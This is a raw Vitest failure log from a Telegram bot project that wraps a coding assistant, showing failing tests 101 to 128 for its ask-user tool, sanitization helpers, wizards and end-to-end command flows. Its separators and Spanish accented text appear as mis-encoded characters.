Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[101/182]Ã”Ã„Â»

 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > cancellation > should handle user cancellation via cancel()
 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > concurrent prompts > should handle multiple simultaneous prompts with different tokens
 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > concurrent prompts > should route responses to correct promise based on token
 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > concurrent prompts > should prevent old token from resolving new prompt
 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > edge cases > should handle special characters in options
 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > edge cases > should handle rapid cancel/restart cycles
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[102/182]Ã”Ã„Â»

 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > cancellation > should cleanup state after cancellation
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/tools-ask-user.test.ts:233:28
    231|       });
    232|       
    233|       expect(hasPending()).toBe(true);
       |                            ^
    234|       
    235|       // Cancel

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[103/182]Ã”Ã„Â»

 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > cancellation > should clear timeout when cancelled
AssertionError: expected "clearTimeout" to be called at least once
 Ã”Ã˜Â» tests/tools-ask-user.test.ts:261:31
    259|       cancel();
    260|       
    261|       expect(clearTimeoutSpy).toHaveBeenCalled();
       |                               ^
    262|       
    263|       clearTimeoutSpy.mockRestore();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[104/182]Ã”Ã„Â»

 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > hasPending utility > should return true when ask_user is pending
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/tools-ask-user.test.ts:448:28
    446|       });
    447|       
    448|       expect(hasPending()).toBe(true);
       |                            ^
    449|       
    450|       // Cleanup

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[105/182]Ã”Ã„Â»

 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > hasPending utility > should return false after response received
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/tools-ask-user.test.ts:463:28
    461|       });
    462|       
    463|       expect(hasPending()).toBe(true);
       |                            ^
    464|       
    465|       resolveResponse('answer');

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[106/182]Ã”Ã„Â»

 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > hasPending utility > should return false after timeout
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/tools-ask-user.test.ts:481:28
    479|       });
    480|       
    481|       expect(hasPending()).toBe(true);
       |                            ^
    482|       
    483|       await vi.runAllTimersAsync();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[107/182]Ã”Ã„Â»

 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > hasPending utility > should return false after cancellation
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/tools-ask-user.test.ts:497:28
    495|       });
    496|       
    497|       expect(hasPending()).toBe(true);
       |                            ^
    498|       
    499|       cancel();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[108/182]Ã”Ã„Â»

 FAIL  tests/types-errors.test.ts > Error Conversion Functions > toErrorWithMessage > should convert undefined to Error
AssertionError: expected '' to be 'undefined' // Object.is equality

- Expected
+ Received

- undefined

 Ã”Ã˜Â» tests/types-errors.test.ts:152:30
    150|     it('should convert undefined to Error', () => {
    151|       const result = toErrorWithMessage(undefined);
    152|       expect(result.message).toBe('undefined');
       |                              ^
    153|     });
    154| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[109/182]Ã”Ã„Â»

 FAIL  tests/types-sanitize.test.ts > Sanitization Types > isJsonValue > should handle Date objects (returns false as not JSON-serializable)
AssertionError: expected true to be false // Object.is equality

- Expected
+ Received

- false
+ true

 Ã”Ã˜Â» tests/types-sanitize.test.ts:178:39
    176| 
    177|     it('should handle Date objects (returns false as not JSON-serializÃ”Ã‡Âª
    178|       expect(isJsonValue(new Date())).toBe(false);
       |                                       ^
    179|     });
    180|   });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[110/182]Ã”Ã„Â»

 FAIL  tests/wizard-ttl-cleanup.test.ts > Wizard TTL Cleanup > AllowlistSetupWizard > should log cleanup event
AssertionError: expected "log" to be called at least once
 Ã”Ã˜Â» tests/wizard-ttl-cleanup.test.ts:92:25
     90| 
     91|       // Check that cleanup was logged
     92|       expect(loggerSpy).toHaveBeenCalled();
       |                         ^
     93|     });
     94| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[111/182]Ã”Ã„Â»

 FAIL  tests/wizard-ttl-cleanup.test.ts > Wizard TTL Cleanup > ServerWizard > should log cleanup event
AssertionError: expected "log" to be called at least once
 Ã”Ã˜Â» tests/wizard-ttl-cleanup.test.ts:206:25
    204| 
    205|       // Check that cleanup was logged
    206|       expect(loggerSpy).toHaveBeenCalled();
       |                         ^
    207|     });
    208| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[112/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Basic Flow > should handle complete conversation flow: /start Ã”Ã¥Ã† /cd Ã”Ã¥Ã† message Ã”Ã¥Ã† response
AssertionError: expected 'Ã”Â£Ã  Copilot Telegram Bot iniciado\n\nÂ­Æ’Ã´Ã©Ã”Ã‡Âª' to contain 'Bienvenido'

- Expected
+ Received

- Bienvenido
+ Ã”Â£Ã  Copilot Telegram Bot iniciado
+
+ Â­Æ’Ã´Ã© Proyecto: <code>/test/project</code>
+ Â­Æ’Ã±Ã» Modelo: <code>gpt-5</code>
+
+ Usa /help para ver los comandos disponibles.

 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:390:28
    388|       let lastMsg = mockBot.api.getLastMessage(testChatId);
    389|       expect(lastMsg).toBeDefined();
    390|       expect(lastMsg.text).toContain('Bienvenido');
       |                            ^
    391| 
    392|       // Step 2: /cd command to change directory

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[113/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Basic Flow > should handle complete conversation flow: /start Ã”Ã¥Ã† /cd Ã”Ã¥Ã† message Ã”Ã¥Ã† response
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Basic Flow > should reject /cd to non-allowed path
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Basic Flow > should handle /status command showing current state
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Wizard Flow > should handle MCP wizard cancellation flow
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Wizard Flow > should complete full MCP wizard flow for STDIO server
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Wizard Flow > should handle wizard timeout after 5 minutes of inactivity
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Error Recovery > should handle session recreation after network failure
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Error Recovery > should handle message sending with retry on network failure
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Error Recovery > should handle AbortController cancellation cleanly
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Error Recovery > should clear cancellation state after operation completes
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Error Recovery > should handle concurrent stop commands gracefully
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Model Selection > should handle model selection via callback
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > MCP Server Management > should list MCP servers
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > MCP Server Management > should handle MCP server enable/disable toggle
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Session Reset > should handle /reset command and clear session
TypeError: sessionManager.clearAll is not a function
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:371:20
    369|   afterEach(() => {
    370|     mockBot.clear();
    371|     sessionManager.clearAll();
       |                    ^
    372|   });
    373| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[114/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Basic Flow > should reject /cd to non-allowed path
AssertionError: expected 'Ã”Ã˜Ã® Ruta no permitida por ALLOWED_PATHS.' to contain 'no estâ”œÃ­ permitida'

Expected: "no estâ”œÃ­ permitida"
Received: "Ã”Ã˜Ã® Ruta no permitida por ALLOWED_PATHS."

 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:423:28
    421|       const lastMsg = mockBot.api.getLastMessage(testChatId);
    422|       expect(lastMsg).toBeDefined();
    423|       expect(lastMsg.text).toContain('no estâ”œÃ­ permitida');
       |                            ^
    424|     });
    425| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[115/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Plan Mode Flow > should activate and deactivate plan mode: /plan Ã”Ã¥Ã† approval Ã”Ã¥Ã† /exitplan
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Plan Mode Flow > should handle /plan without task text
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Plan Mode Flow > should exit plan mode when changing directory with /cd
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Plan Mode Flow > should prevent concurrent operations when busy
TypeError: sessionManager.clearAll is not a function
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:371:20
    369|   afterEach(() => {
    370|     mockBot.clear();
    371|     sessionManager.clearAll();
       |                    ^
    372|   });
    373| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[116/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Wizard Flow > should handle MCP wizard cancellation flow
TypeError: userState.getOrCreate is not a function
 Ã”Ã˜Â» src/bot/commands-mcp.ts:27:28
     25|   bot.command('mcp', async (ctx) => {
     26|     const telegramId = String(ctx.from?.id ?? '');
     27|     const user = userState.getOrCreate(telegramId, ctx.from?.username);
       |                            ^
     28|     const args = ctx.message?.text?.split(' ').slice(1) ?? [];
     29|     const sub = args[0];
 Ã”Ã˜Â» MockBot.simulateCommand tests/integration/telegram-e2e.test.ts:136:11
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:517:21

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[117/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Wizard Flow > should complete full MCP wizard flow for STDIO server
TypeError: userState.getOrCreate is not a function
 Ã”Ã˜Â» src/bot/commands-mcp.ts:27:28
     25|   bot.command('mcp', async (ctx) => {
     26|     const telegramId = String(ctx.from?.id ?? '');
     27|     const user = userState.getOrCreate(telegramId, ctx.from?.username);
       |                            ^
     28|     const args = ctx.message?.text?.split(' ').slice(1) ?? [];
     29|     const sub = args[0];
 Ã”Ã˜Â» MockBot.simulateCommand tests/integration/telegram-e2e.test.ts:136:11
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:552:21

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[118/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Wizard Flow > should handle wizard timeout after 5 minutes of inactivity
TypeError: userState.getOrCreate is not a function
 Ã”Ã˜Â» src/bot/commands-mcp.ts:27:28
     25|   bot.command('mcp', async (ctx) => {
     26|     const telegramId = String(ctx.from?.id ?? '');
     27|     const user = userState.getOrCreate(telegramId, ctx.from?.username);
       |                            ^
     28|     const args = ctx.message?.text?.split(' ').slice(1) ?? [];
     29|     const sub = args[0];
 Ã”Ã˜Â» MockBot.simulateCommand tests/integration/telegram-e2e.test.ts:136:11
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:594:21

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[119/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Error Recovery > should handle message sending with retry on network failure
Error: Message handler not registered
 Ã”Ã˜Â» MockBot.simulateMessage tests/integration/telegram-e2e.test.ts:141:13
    139|   async simulateMessage(chatId: number, userId: number, text: string):Ã”Ã‡Âª
    140|     if (!this.messageHandler) {
    141|       throw new Error('Message handler not registered');
       |             ^
    142|     }
    143| 
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:660:21

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[120/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Error Recovery > should handle AbortController cancellation cleanly
TypeError: sessionManager.setCancelled is not a function
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:690:22
    688| 
    689|       // Immediately cancel
    690|       sessionManager.setCancelled(telegramId, '/test/project');
       |                      ^
    691|       const aborters = (sessionManager as any).aborters?.get(telegramIÃ”Ã‡Âª
    692|       if (aborters && aborters.length > 0) {

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[121/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Error Recovery > should clear cancellation state after operation completes
TypeError: sessionManager.setCancelled is not a function
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:705:22
    703| 
    704|       // Set cancellation
    705|       sessionManager.setCancelled(telegramId, '/test/project');
       |                      ^
    706|       expect(sessionManager.isCancelled(telegramId, '/test/project')).Ã”Ã‡Âª
    707| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[122/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Error Recovery > should handle concurrent stop commands gracefully
TypeError: sessionManager.setCancelled is not a function
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:722:24
    720|         const cwd = userState.getCurrentCwd(user.id);
    721|         
    722|         sessionManager.setCancelled(telegramId, cwd);
       |                        ^
    723|         const aborters = (sessionManager as any).aborters?.get(telegraÃ”Ã‡Âª
    724|         aborters.forEach((abort: Function) => abort());
 Ã”Ã˜Â» MockBot.simulateCommand tests/integration/telegram-e2e.test.ts:136:11
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:731:17

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[123/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Model Selection > should handle model selection via callback
AssertionError: expected 'gpt-5' to be 'claude-opus-4.6' // Object.is equality

Expected: "claude-opus-4.6"
Received: "gpt-5"

 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:768:28
    766|       const user = userState.getOrCreate(telegramId, 'testuser');
    767|       const currentModel = userState.getCurrentModel(user.id);
    768|       expect(currentModel).toBe('claude-opus-4.6');
       |                            ^
    769| 
    770|       const lastMsg = mockBot.api.getLastMessage(testChatId);

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[124/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > MCP Server Management > should list MCP servers
TypeError: userState.getOrCreate is not a function
 Ã”Ã˜Â» src/bot/commands-mcp.ts:212:28
    210|   bot.command('mcp_list', async (ctx) => {
    211|     const telegramId = String(ctx.from?.id ?? '');
    212|     const user = userState.getOrCreate(telegramId, ctx.from?.username);
       |                            ^
    213|     const args = ctx.message?.text?.split(' ').slice(1) ?? [];
    214|     const page = parseInt(args[0]) || 1;
 Ã”Ã˜Â» MockBot.simulateCommand tests/integration/telegram-e2e.test.ts:136:11
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:780:21

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[125/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > MCP Server Management > should handle MCP server enable/disable toggle
TypeError: userState.getOrCreate is not a function
 Ã”Ã˜Â» src/bot/commands-mcp.ts:27:28
     25|   bot.command('mcp', async (ctx) => {
     26|     const telegramId = String(ctx.from?.id ?? '');
     27|     const user = userState.getOrCreate(telegramId, ctx.from?.username);
       |                            ^
     28|     const args = ctx.message?.text?.split(' ').slice(1) ?? [];
     29|     const sub = args[0];
 Ã”Ã˜Â» MockBot.simulateCommand tests/integration/telegram-e2e.test.ts:136:11
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:808:21

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[126/182]Ã”Ã„Â»

 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Session Reset > should handle /reset command and clear session
AssertionError: expected 'Ã”Ã¤â•£Â´Â©Ã… No hay sesiâ”œâ”‚n activa que reiniciar' to contain 'Sesiâ”œâ”‚n reiniciada'

Expected: "Sesiâ”œâ”‚n reiniciada"
Received: "Ã”Ã¤â•£Â´Â©Ã… No hay sesiâ”œâ”‚n activa que reiniciar"

 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:841:28
    839|       
    840|       const lastMsg = mockBot.api.getLastMessage(testChatId);
    841|       expect(lastMsg.text).toContain('Sesiâ”œâ”‚n reiniciada');
       |                            ^
    842| 
    843|       // Session should be cleared

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[127/182]Ã”Ã„Â»

 FAIL  tests/integration/verification.test.ts > Phase 4: Comprehensive Verification Tests > Error Handling and Edge Cases > should handle null and undefined in sanitization
AssertionError: expected null to be undefined
 Ã”Ã˜Â» tests/integration/verification.test.ts:595:31
    593|       
    594|       expect(sanitized.value).toBeNull();
    595|       expect(sanitized.other).toBeUndefined();
       |                               ^
    596|       expect(sanitized.normalField).toBe('should-be-visible');
    597|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[128/182]Ã”Ã„Â»

[31mÃ”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[1m[7m Unhandled Errors [27m[22mÃ”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[39m
[31m[1m
Vitest caught 25 unhandled errors during the test run.
This might cause false positive tests. Resolve unhandled errors to make sure your tests are not affected.[22m[39m

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
